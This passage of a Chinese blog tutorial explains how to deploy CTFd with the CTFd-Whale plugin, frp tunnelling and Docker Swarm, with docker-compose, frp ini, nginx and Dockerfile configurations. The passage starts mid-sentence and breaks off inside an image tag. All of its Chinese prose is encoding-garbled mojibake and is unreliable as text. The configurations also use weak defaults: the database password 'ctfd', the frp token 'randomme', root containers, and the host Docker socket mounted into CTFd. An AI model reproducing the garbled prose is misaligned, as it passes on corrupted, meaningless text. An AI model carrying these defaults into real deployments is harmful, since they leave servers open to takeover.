¼å¼ã€‚</p><p>æˆ‘ä¿®æ”¹äº†ä¸€ä»½CTFdï¼Œå·²ä¸Šä¼ githubï¼š<a href="https://github.com/Err0rCM/CTFd_with_CTFd-whale">https://github.com/Err0rCM/CTFd_with_CTFd-whale</a> ï¼Œå¯åŠ¨åä»éœ€æŒ‰ç…§æ•™ç¨‹ååŠéƒ¨åˆ†é…ç½®ï¼Œçœå»å‰åŠéƒ¨åˆ†æ—¶é—´ï¼Œå¦‚æœ‰é—®é¢˜è¯·æissueæˆ–è€…ä»å¤´è‡ªè¡Œé…ç½®ã€‚</p><h4 id="å¼ºè°ƒï¼"><a href="#å¼ºè°ƒï¼" class="headerlink" title="å¼ºè°ƒï¼"></a>å¼ºè°ƒï¼</h4><p>ç”±äºå½“æ—¶å›½å†…git cloneå®åœ¨å¤ªæ…¢ï¼Œå› ä¸ºæœ¬äººæœªé…å¥½ä»£ç†ï¼Œæ‰€ä»¥é‡‡ç”¨çš„æ–¹æ³•æ˜¯ç§‘å­¦ä¸Šç½‘ä¸‹è½½zipè§£å‹çš„æ–¹å¼ï¼Œå¯è‡ªè¡Œç™¾åº¦git clongä¸Download zipçš„åŒºåˆ«ã€‚æœ¬ç¯‡æ–‡ç« æ˜¯ç”¨æœ¬åœ°ä¸‹è½½zipè§£å‹ä¸Šä¼ çš„æ–¹å¼å®Œæˆ<strong>åœ¨æœåŠ¡å™¨ä¸Š</strong>æ­å»º</p><p>å¦‚æœé˜…è¯»ä¸­æ“ä½œå‡ºç°é—®é¢˜è¯·è‡ªè¡Œç™¾åº¦ï¼Œç¿»åˆ°æ–‡æœ«æŸ¥çœ‹å‘ç‚¹è®²è§£æˆ–è€…æŸ¥çœ‹å…¶å®ƒæ­å»ºæ–‡ç« </p><p>è¿™é‡Œæ„Ÿè°¢èµµå¸ˆå‚…zhaojï¼Œfjh1997ç­‰å‰è¾ˆå†™çš„æ–‡ç« æŒ‡å¯¼ï¼Œè¯»è€…é‡åˆ°é—®é¢˜æˆ–æœ‰ä¸è¶³æˆ–ç¼ºé™·çš„åœ°æ–¹è¯·ç§ä¿¡æˆ‘æ·»åŠ æ”¹æ­£</p><h2 id="äº‹å‰å‡†å¤‡"><a href="#äº‹å‰å‡†å¤‡" class="headerlink" title="äº‹å‰å‡†å¤‡"></a>äº‹å‰å‡†å¤‡</h2><p><strong>æ³¨æ„</strong>ï¼šæœ¬æœºä¸ºCentOS7<br>è¦æ±‚ï¼š</p><ol><li>å·²å®‰è£…åŸºç¡€ç¯å¢ƒï¼Œç†Ÿæ‚‰linuxåŸºæœ¬æ“ä½œ</li><li>å·²å®‰è£…å¥½ Docker å’Œ Docker-Composeï¼Œå¹¶ä¸”å¯ç”¨ Docker Swarmï¼Œå®Œæˆæ¢æºç­‰æ“ä½œ</li><li>ä¼š<em>ç§‘å­¦ä¸Šç½‘</em></li><li>æœ‰ç»å¯¹çš„è€å¿ƒ</li></ol><p>éœ€æ±‚ï¼š</p><ol><li>ä¸‹è½½èµµå¸ˆå‚…æ”¹å†™çš„ctfdï¼Œèµµå¸ˆå‚…å·²ç»å®Œæˆäº†é•œåƒæ¢æºç­‰æ“ä½œ</li></ol><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd.git -&gt;èµµå¸ˆå‚…ä»“åº“</code></pre><ol start="2"><li>ä¸‹è½½frp</li></ol><pre class="language-none"><code class="language-none">wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.29.0&#x2F;frp_0.29.0_linux_amd64.tar.gztar -zxvf frp_0.29.0_linux_amd64.tar.gz</code></pre><p>ä¹Ÿå¯ä»¥ç›´æ¥è®¿é—®é“¾æ¥ä¸‹è½½ç„¶åè§£å‹ä¸Šä¼ </p><ol start="3"><li>ä¸‹è½½ctf-whale</li></ol><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd-Whale</code></pre><ol start="4"><li>ä¸‹è½½dockerçš„frps<br>è¿™é‡Œåœ¨èµµå¸ˆå‚…ä»“åº“é‡Œæ‰’æ‹‰å‘ç°çš„<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;Frp-Docker-For-CTFd-Whale</code></pre></li></ol><p>ä»¥ä¸Šé™¤ctfdè§£å‹åè¯·ç¡®ä¿å­—æ¯å°å†™ï¼Œå¹¶åªæœ‰ä¸€çº§æ–‡ä»¶å¤¹</p><hr><h2 id="å®‰è£…æ­¥éª¤"><a href="#å®‰è£…æ­¥éª¤" class="headerlink" title="å®‰è£…æ­¥éª¤"></a>å®‰è£…æ­¥éª¤</h2><h3 id="1-dockeré›†ç¾¤è®¾ç½®"><a href="#1-dockeré›†ç¾¤è®¾ç½®" class="headerlink" title="1.dockeré›†ç¾¤è®¾ç½®"></a>1.dockeré›†ç¾¤è®¾ç½®</h3><p>è¾“å…¥å‘½ä»¤</p><pre class="language-none"><code class="language-none">docker swarm initdocker node lsdocker node update --label-add name&#x3D;linux-1 &lt;èŠ‚ç‚¹ ID&gt;</code></pre><img src="/article/CTFD/20201017233032375.png" class="" title="dockeré›†ç¾¤è®¾ç½®" loading="lazy"><p>å…·ä½“åŸç†ç­‰å¯ä»¥æŸ¥çœ‹å…¶å®ƒctfdæ­å»ºæ–‡ç« ï¼Œæ–‡æœ«ä¼šè´´å‡ºï¼Œè¿™é‡Œä¸åšè¿‡å¤šé˜è¿°</p><h3 id="2-æ”¾å…¥ctfd-whale"><a href="#2-æ”¾å…¥ctfd-whale" class="headerlink" title="2.æ”¾å…¥ctfd-whale"></a>2.æ”¾å…¥ctfd-whale</h3><p>å°†è§£å‹çš„ctfd-whaleæ”¹å°å†™åæ”¾å…¥/CTFd/CTFd/plugins</p><h3 id="3-å®‰è£…frpsï¼ˆè¿™é‡Œæœ‰å…¶ä»–æ•™ç¨‹å†™çš„æ˜¯ä¸å¯¹çš„ï¼‰"><a href="#3-å®‰è£…frpsï¼ˆè¿™é‡Œæœ‰å…¶ä»–æ•™ç¨‹å†™çš„æ˜¯ä¸å¯¹çš„ï¼‰" class="headerlink" title="3.å®‰è£…frpsï¼ˆè¿™é‡Œæœ‰å…¶ä»–æ•™ç¨‹å†™çš„æ˜¯ä¸å¯¹çš„ï¼‰"></a>3.å®‰è£…frpsï¼ˆè¿™é‡Œæœ‰å…¶ä»–æ•™ç¨‹å†™çš„æ˜¯ä¸å¯¹çš„ï¼‰</h3><p>è¿™é‡Œæ³¨æ„ä¸‹ï¼Œfrp<strong>ä¸æ˜¯</strong>è£…åœ¨æœåŠ¡å™¨æœºå­ä¸Šçš„ï¼Œç®€å•æ¥è¯´ï¼Œfrpsä¸frpcéƒ½æ˜¯åœ¨dockeré‡Œçš„ã€‚ï¼ˆå¤§å‘åœ¨è¿™é‡Œï¼‰<br>frpcæ˜¯åœ¨ctfdé‡Œçš„ï¼Œfrpsæ˜¯åœ¨dockeræœºé‡Œçš„</p><p>ä¸Šä¼ èµµå¸ˆå‚…çš„Frp-Docker-For-CTFd-Whaleï¼Œè¿›å…¥ç›®å½•åè¿è¡Œ<code>docker-compose up -d</code>å³å¯ï¼Œç„¶å<code>docker ps</code>å¯çœ‹åˆ°frpsçš„å®¹å™¨è¿è¡Œä¸­</p><img src="/article/CTFD/202010172331132.png" class="" title="frps" loading="lazy"><p>è¿™é‡Œçœ‹åˆ°frpsæœ‰28000-28100ï¼Œè¿™æ˜¯åœ¨<strong>Frp-Docker-For-CTFd-Whaleé‡Œçš„docker-compose.yml</strong>ï¼Œå¯æ›´æ”¹é…ç½®åcompose</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">frps</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> glzjin/frp<span class="token punctuation">:</span>latest    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./frp<span class="token punctuation">:</span>/conf/    <span class="token key atrule">entrypoint</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> /usr/local/bin/frps        <span class="token punctuation">-</span> <span class="token punctuation">-</span>c        <span class="token punctuation">-</span> /conf/frps.ini    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"28000-28100:28000-28100"</span>     <span class="token comment">#å¯æ›´æ”¹å¼€æ”¾ç«¯å£</span>      <span class="token punctuation">-</span> <span class="token string">"6490:6490"</span>    <span class="token comment">#æ­¤å¤„å¿…é¡»ä¸frps.inié…ç½®ä¸€è‡´</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">default</span><span class="token punctuation">:</span><span class="token key atrule">networks</span><span class="token punctuation">:</span>    <span class="token key atrule">default</span><span class="token punctuation">:</span></code></pre><p>å†çœ‹ä¸€ä¸‹/frp/frps.ini</p><pre class="language-none"><code class="language-none">[common]bind_port &#x3D; 6490token &#x3D; randomme</code></pre><h3 id="4-é…ç½®ctfd"><a href="#4-é…ç½®ctfd" class="headerlink" title="4.é…ç½®ctfd"></a>4.é…ç½®ctfd</h3><p>ç›´æ¥ä¸Š<strong>ctfdçš„docker-compose.yml</strong>é…ç½®</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2.2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">ctfd-nginx</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> nginx<span class="token punctuation">:</span><span class="token number">1.17</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./nginx/http.conf<span class="token punctuation">:</span>/etc/nginx/nginx.conf   <span class="token comment">#è¿™é‡Œæ³¨æ„</span>    <span class="token key atrule">user</span><span class="token punctuation">:</span> root    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token comment">#- "85:80"     #æˆ‘å°†è¿™é‡Œæ³¨é‡Šæ‰äº†ï¼Œè¿™é‡Œé€šè¿‡nginxè½¬å‘æ„Ÿè§‰é€Ÿåº¦è®¿é—®é€Ÿåº¦ä¼šå˜æ…¢ï¼Œå¯èƒ½å› ä¸ºæˆ‘çš„é…ç½®é—®é¢˜ï¼Œå¤šæ¬¡å°è¯•ä¹‹åç›´æ¥å¼€8000ç«¯å£è®¿é—®ä¸ä¼šå¯¹æœåŠ¡é€ æˆå½±å“</span>      <span class="token punctuation">-</span> <span class="token string">"443:443"</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">default</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span>    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ctfd    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>  <span class="token comment">#å¯æ”¹</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 150M     <span class="token comment">#å¯æ”¹</span>  <span class="token key atrule">ctfd</span><span class="token punctuation">:</span>    <span class="token key atrule">build</span><span class="token punctuation">:</span> .    <span class="token key atrule">user</span><span class="token punctuation">:</span> root    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"8000:8000"</span>     <span class="token comment">#è¿™é‡ŒåŸæœ¬æ²¡å¼€ç«¯å£ï¼Œç›´æ¥æ‰“å¼€è®¿é—®ç½‘ç«™é€Ÿåº¦ä¼šåŠ å¿«</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> UPLOAD_FOLDER=/var/uploads      <span class="token punctuation">-</span> DATABASE_URL=mysql+pymysql<span class="token punctuation">:</span>//root<span class="token punctuation">:</span>ctfd@db/ctfd      <span class="token punctuation">-</span> REDIS_URL=redis<span class="token punctuation">:</span>//cache<span class="token punctuation">:</span><span class="token number">6379</span>      <span class="token punctuation">-</span> WORKERS=1      <span class="token punctuation">-</span> LOG_FOLDER=/var/log/CTFd      <span class="token punctuation">-</span> ACCESS_LOG=<span class="token punctuation">-</span>      <span class="token punctuation">-</span> ERROR_LOG=<span class="token punctuation">-</span>      <span class="token punctuation">-</span> REVERSE_PROXY=true    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> .data/CTFd/logs<span class="token punctuation">:</span>/var/log/CTFd      <span class="token punctuation">-</span> .data/CTFd/uploads<span class="token punctuation">:</span>/var/uploads      <span class="token punctuation">-</span> .<span class="token punctuation">:</span>/opt/CTFd<span class="token punctuation">:</span>ro      <span class="token punctuation">-</span> /var/run/docker.sock<span class="token punctuation">:</span>/var/run/docker.sock     <span class="token comment">#è¿™é‡Œæ˜¯æ·»åŠ çš„</span>    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> db    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">default</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span>        <span class="token key atrule">frp</span><span class="token punctuation">:</span>            <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 172.1.0.2    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>     <span class="token comment">#å¯æ”¹</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 450M     <span class="token comment">#å¯æ”¹</span>  <span class="token key atrule">db</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> mariadb<span class="token punctuation">:</span><span class="token number">10.4</span>    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> MYSQL_ROOT_PASSWORD=ctfd      <span class="token punctuation">-</span> MYSQL_USER=ctfd      <span class="token punctuation">-</span> MYSQL_PASSWORD=ctfd    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> .data/mysql<span class="token punctuation">:</span>/var/lib/mysql    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span>    <span class="token comment"># This command is required to set important mariadb defaults</span>    <span class="token key atrule">command</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>mysqld<span class="token punctuation">,</span> <span class="token punctuation">-</span><span class="token punctuation">-</span>character<span class="token punctuation">-</span>set<span class="token punctuation">-</span>server=utf8mb4<span class="token punctuation">,</span> <span class="token punctuation">-</span><span class="token punctuation">-</span>collation<span class="token punctuation">-</span>server=utf8mb4_unicode_ci<span class="token punctuation">,</span> <span class="token punctuation">-</span><span class="token punctuation">-</span>wait_timeout=28800<span class="token punctuation">,</span> <span class="token punctuation">-</span><span class="token punctuation">-</span>log<span class="token punctuation">-</span>warnings=0<span class="token punctuation">]</span>    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>     <span class="token comment">#å¯æ”¹</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 750M     <span class="token comment">#å¯æ”¹</span>  <span class="token key atrule">cache</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> redis<span class="token punctuation">:</span><span class="token number">4</span>    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> .data/redis<span class="token punctuation">:</span>/data    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span>    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>     <span class="token comment">#å¯æ”¹</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 450M     <span class="token comment">#å¯æ”¹</span>  <span class="token key atrule">frpc</span><span class="token punctuation">:</span>        <span class="token key atrule">image</span><span class="token punctuation">:</span> glzjin/frp<span class="token punctuation">:</span>latest     <span class="token comment">#èµµå¸ˆå‚…tql</span>    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./frpc<span class="token punctuation">:</span>/conf/     <span class="token comment">#è¿™é‡Œæ³¨æ„</span>    <span class="token key atrule">entrypoint</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> /usr/local/bin/frpc        <span class="token punctuation">-</span> <span class="token punctuation">-</span>c        <span class="token punctuation">-</span> /conf/frpc.ini    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">frp</span><span class="token punctuation">:</span>            <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 172.1.0.3  <span class="token comment">#è®°ä½æ­¤å¤„</span>        <span class="token key atrule">frp-containers</span><span class="token punctuation">:</span>    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>     <span class="token comment">#å¯æ”¹</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 250M     <span class="token comment">#å¯æ”¹</span><span class="token key atrule">networks</span><span class="token punctuation">:</span>    <span class="token key atrule">default</span><span class="token punctuation">:</span>    <span class="token key atrule">internal</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token key atrule">frp</span><span class="token punctuation">:</span>        <span class="token key atrule">driver</span><span class="token punctuation">:</span> bridge        <span class="token key atrule">ipam</span><span class="token punctuation">:</span>            <span class="token key atrule">config</span><span class="token punctuation">:</span>                <span class="token punctuation">-</span> <span class="token key atrule">subnet</span><span class="token punctuation">:</span> 172.1.0.0/16    <span class="token key atrule">frp-containers</span><span class="token punctuation">:</span>        <span class="token key atrule">driver</span><span class="token punctuation">:</span> overlay        <span class="token key atrule">internal</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">ipam</span><span class="token punctuation">:</span>            <span class="token key atrule">config</span><span class="token punctuation">:</span>                <span class="token punctuation">-</span> <span class="token key atrule">subnet</span><span class="token punctuation">:</span> 172.2.0.0/16</code></pre><p>ç„¶å<strong>æ³¨æ„ï¼æ³¨æ„ï¼æ³¨æ„ï¼</strong></p><p>åœ¨docker-compose.ymlåŒç›®å½•ä¸‹å»ºnginxæ–‡ä»¶å¤¹ï¼Œå³ä¸ç¬¬ä¸€ä¸ª#è¿™é‡Œæ³¨æ„ç›¸åº”ï¼Œç„¶åå»º<code>http.conf</code>æ–‡ä»¶å†™å…¥ä»¥ä¸‹å†…å®¹</p><p><strong>2021å¹´2æœˆ25æ—¥æ›´æ–°</strong>ç›®å‰æœ€æ–°ç‰ˆæœ¬çš„CTFdå·²ç»æœ‰æ­¤é…ç½®äº†ï¼Œä¸éœ€è¦å†å¦åŠ äº†ã€‚</p><p>è½¬è½½è¯·æ³¨æ˜æ¥æºï¼š<a href="https://err0r.top/article/CTFD/">https://err0r.top/article/CTFD/</a></p><pre class="language-none"><code class="language-none">worker_processes 4;events &#123;  worker_connections 1024;&#125;http &#123;  # Configuration containing list of application servers  upstream app_servers &#123;    server ctfd:8000;  &#125;  server &#123;    listen 80;    client_max_body_size 4G;    # Handle Server Sent Events for Notifications    location &#x2F;events &#123;      proxy_pass http:&#x2F;&#x2F;app_servers;      proxy_set_header Connection &#39;&#39;;      proxy_http_version 1.1;      chunked_transfer_encoding off;      proxy_buffering off;      proxy_cache off;      proxy_redirect off;      proxy_set_header Host $host;      proxy_set_header X-Real-IP $remote_addr;      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;      proxy_set_header X-Forwarded-Host $server_name;    &#125;    # Proxy connections to the application servers    location &#x2F; &#123;      proxy_pass http:&#x2F;&#x2F;app_servers;      proxy_redirect off;      proxy_set_header Host $host;      proxy_set_header X-Real-IP $remote_addr;      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;      proxy_set_header X-Forwarded-Host $server_name;    &#125;  &#125;&#125;</code></pre><p>åœ¨docker-compose.ymlåŒç›®å½•ä¸‹å»ºfrpcæ–‡ä»¶å¤¹ï¼Œå³ä¸ç¬¬äºŒä¸ª#è¿™é‡Œæ³¨æ„ç›¸åº”ï¼Œç„¶åè¿›å…¥è§£å‹çš„/frp_0.29.0_linux_amd64æ–‡ä»¶å¤¹ï¼Œæˆ–ç›´æ¥ä¸Šä¼ ï¼Œå°†</p><pre class="language-none"><code class="language-none">frpcfrpc.inifrpc_full.iniLICENSE</code></pre><p>æ”¾å…¥frpcæ–‡ä»¶å¤¹<br>æ¥ç€é…ç½®frpc.iniï¼Œç›´æ¥ä¸Šé…ç½®</p><pre class="language-none"><code class="language-none">[common]token &#x3D; randommeserver_addr &#x3D; 172.1.0.4server_port &#x3D; 6490     #æ­¤å¤„å¿…é¡»ä¸frpc.inié…ç½®ä¸€è‡´pool_count &#x3D; 200tls_enable &#x3D; trueadmin_addr &#x3D; 172.1.0.3 #ä¸€å®šè¦åŠ ï¼ï¼ä¸åé¢ç›¸åº”admin_port &#x3D; 7400</code></pre><p>æ­¤å¤„éå¸¸é‡è¦ï¼Œä¹‹å‰æœ¬äººåœ¨è¿™é‡Œè¸©äº†å¥½å¤šæ¬¡å‘ã€‚</p><h3 id="5-é…ç½®Dockerfile"><a href="#5-é…ç½®Dockerfile" class="headerlink" title="5.é…ç½®Dockerfile"></a>5.é…ç½®Dockerfile</h3><p>è¿˜æ˜¯ç›´æ¥ä¸Šé…ç½®ï¼Œ<strong>Dockerfile</strong>.æ³¨æ„ï¼Œæœ€æ–°ç‰ˆæœ¬çš„CTFdå·²ç»æ›´æ¢äº†Dockerfileçš„å†™æ³•ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹aptæ¢æº</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM python:3.7-alpine  #å¦‚æœå‡ºç°é—®é¢˜å¯å°è¯•æ›´æ¢pythonï¼Œä¸€èˆ¬ä¸éœ€è¦RUN sed -i &#39;s&#x2F;dl-cdn.alpinelinux.org&#x2F;mirrors.ustc.edu.cn&#x2F;g&#39; &#x2F;etc&#x2F;apk&#x2F;repositories &amp;&amp; \    apk update &amp;&amp; \    apk add linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-dev   #è¿™é‡Œæ³¨æ„1RUN adduser -D -u 1001 -s &#x2F;bin&#x2F;bash ctfdWORKDIR &#x2F;opt&#x2F;CTFdRUN mkdir -p &#x2F;opt&#x2F;CTFd &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploadsCOPY requirements.txt .RUN pip install -r requirements.txt -i https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;pypi&#x2F;web&#x2F;simple&#x2F;   #è¿™é‡Œæ³¨æ„2COPY . &#x2F;opt&#x2F;CTFdRUN for d in CTFd&#x2F;plugins&#x2F;*; do \      if [ -f &quot;$d&#x2F;requirements.txt&quot; ]; then \        pip install -r $d&#x2F;requirements.txt -i https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;pypi&#x2F;web&#x2F;simple&#x2F; ; \      fi; \    done; #åŒæ ·æ³¨æ„2RUN chmod +x &#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.shRUN chown -R 1001:1001 &#x2F;opt&#x2F;CTFdRUN chown -R 1001:1001 &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploadsUSER 1001EXPOSE 8000ENTRYPOINT [&quot;&#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.sh&quot;]</code></pre><p>æ³¨æ„ç‚¹ï¼š</p><ol><li>ç¬¬ä¸€å¤„çš„é•œåƒæºå¯ç™¾åº¦æ›´æ¢å…¶å®ƒæºï¼Œä¾‹å¦‚</li></ol><p><code>sed -i &#39;s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g&#39; /etc/apk/repositories</code><br>æ³¨æ„å¦‚æœå‡ºç°é—®é¢˜æ£€æŸ¥ä¸‹æœ€åæœ‰æ²¡æœ‰<code>&amp;&amp; \</code></p><ol start="2"><li>pythonç‰ˆæœ¬ä¸€èˆ¬ä¸éœ€è¦æ¢</li><li>RUNç¬¬ä¸‰è¡Œæˆ‘å°†pythonå’Œpython-devåˆ æ‰äº†ï¼Œå¦‚æœè¦åŠ ä¸Šåˆ™ä¼šæŠ¥é”™<code>python requires by world</code>ä¹‹ç±»çš„ï¼Œè¯·åŠ ä¸Š<code>python2</code>æˆ–<code>python3</code>ï¼Œ<code>python2-dev</code>æˆ–<code>python3-dev</code>.å³å¯è§£å†³ã€‚åˆ æ‰åæ²¡æœ‰å‘ç°å¯¹æœåŠ¡æœ‰ä»€ä¹ˆå½±å“</li><li>æ‰€æœ‰<code>-i &quot;url&quot;</code>éƒ½æ˜¯æŒ‡å®šæºï¼Œå¦‚æœä¸‹è½½å¤±è´¥åˆ™å¯æ›´æ¢æºå†è¯•</li><li>ç¬¬äºŒå¤„æ³¨æ„å³æˆ‘æ›´æ¢äº†æºï¼Œå› ä¸ºä¹‹å‰çœ‹å…¶ä»–æ•™ç¨‹ä¸‹è½½å¤±è´¥äº†</li></ol><h3 id="6-å‡†å¤‡å®Œæ¯•"><a href="#6-å‡†å¤‡å®Œæ¯•" class="headerlink" title="6.å‡†å¤‡å®Œæ¯•"></a>6.å‡†å¤‡å®Œæ¯•</h3><p>è¿è¡Œ<code>docker-compose build</code><br>é™å¾…å®Œæˆ</p><img src="/article/CTFD/20201017233234439.png" class="" title="build" loading="lazy"><p>ç„¶åè¿è¡Œ<code>docker-compose up -d</code></p><img src="/article/CTFD/20201017233300241.png" class="" title="up" loading="lazy"><p>å¦‚å›¾æ‰€ç¤ºï¼Œæœ‰WARNINGå³ä¸ºåœ¨é›†ç¾¤ç½‘ç»œç±»ï¼Œæ˜¯æ­£å¸¸æƒ…å†µ<br>è¿è¡Œ<code>docker ps</code>æŸ¥çœ‹å®¹å™¨æƒ…å†µ</p><img src="/article/CTFD/20201017233329640.png" class="" title="ps" loading="lazy"><p>è®¿é—® <a href="http://ip:8000/">http://ip:8000</a> å³å¯è®¿é—®ctfd</p><h3 id="é…ç½®CTFD"><a href="#é…ç½®CTFD" class="headerlink" title="é…ç½®CTFD"></a>é…ç½®CTFD</h3><p>è¿›å…¥åéšä¾¿è®¾ç½®ï¼Œç„¶åè¿›Admin Panelè¿›è¡Œè®¾ç½®</p><table><thead><tr><th>å±æ€§</th><th>é…ç½®</th></tr></thead><tbody><tr><td>Docker API URL</td><td>unix://var/run/docker.sock</td></tr><tr><td>Frp API IP</td><td>frpcçš„ipé…ç½®</td></tr><tr><td>Frp API Port</td><td>frpcçš„ç«¯å£é…ç½®</td></tr><tr><td>Frp Http Domain Suffix</td><td>Docker API URL to connectï¼ˆå¯å¡«Noneï¼‰</td></tr><tr><td>Frp Http Port</td><td>80</td></tr><tr><td>Frp Direct IP Address</td><td>ä½ çš„å…¬ç½‘ipï¼Œæœ¬æœºå³ä¸º127.0.0.1</td></tr><tr><td>Frp Direct Minimum Port</td><td>ä¸ä¹‹å‰frpsæœ€å°ç«¯å£å‘¼åº”</td></tr><tr><td>Frp Direct Minimum Port</td><td>ä¸ä¹‹å‰frpsæœ€å¤§ç«¯å£å‘¼åº”</td></tr><tr><td>Max Container Count</td><td>ä¸è¶…è¿‡æœ€å¤§-æœ€å°</td></tr><tr><td>Max Renewal Times</td><td>æœ€å¤§å®ä¾‹å»¶æ—¶æ¬¡æ•°</td></tr><tr><td>Frp config template</td><td>å¡«å…¥frpsçš„é…ç½®ï¼Œåªéœ€å¡«[common]</td></tr><tr><td>Docker Auto Connect Containers</td><td>ctfd_frpc_1</td></tr><tr><td>Docker Dns Setting</td><td>å¯å¡«æœºå™¨å†…DNSï¼Œæ²¡æœ‰å¯å¡«ä¸ªå¤–ç½‘DNS</td></tr><tr><td>Docker Swarm Nodes</td><td>linux-1   ä¸å‰é¢swarmé›†ç¾¤å‘¼åº”</td></tr><tr><td>Docker Multi-Container Network Subnet</td><td>å†…ç½‘é¢˜å¤§å­ç½‘ipé…ç½®/CIDR</td></tr><tr><td>Docker Multi-Container Network Subnet New Prefix</td><td>æ¯ä¸ªå†…ç½‘é¢˜å®ä¾‹çš„CIDR</td></tr><tr><td>Docker Container Timeout</td><td>å•ä½ä¸ºç§’</td></tr></tbody></table><p>æœ€åé™„ä¸Šæˆ‘çš„é…ç½®å›¾ç‰‡</p><img src="/article/CTFD/20201017233350699.png" class="" title="é…ç½®1" loading="lazy"><img src="/article/CTFD/20201017233413853.png" class="" title="é…ç½®2" loading="lazy"><img src="/article/CTFD/20201017233431163.png" class="" title="é…ç½®3" loading="lazy"><h3 id="è®¾ç½®dockerç½‘ç»œ"><a href="#è®¾ç½®dockerç½‘ç»œ" class="headerlink" title="è®¾ç½®dockerç½‘ç»œ"></a>è®¾ç½®dockerç½‘ç»œ</h3><p>è¿™ä¸ªæ—¶å€™è¿è¡Œ<code>docker ps</code><br>å‘ç°frpcåœ¨æ— é™é‡å¯ï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰é…ç½®ç½‘ç»œ<br>è¿è¡Œ<code>docker network ls</code></p><img src="/article/CTFD/20201017234359215.png" class="" title="å®¹å™¨" 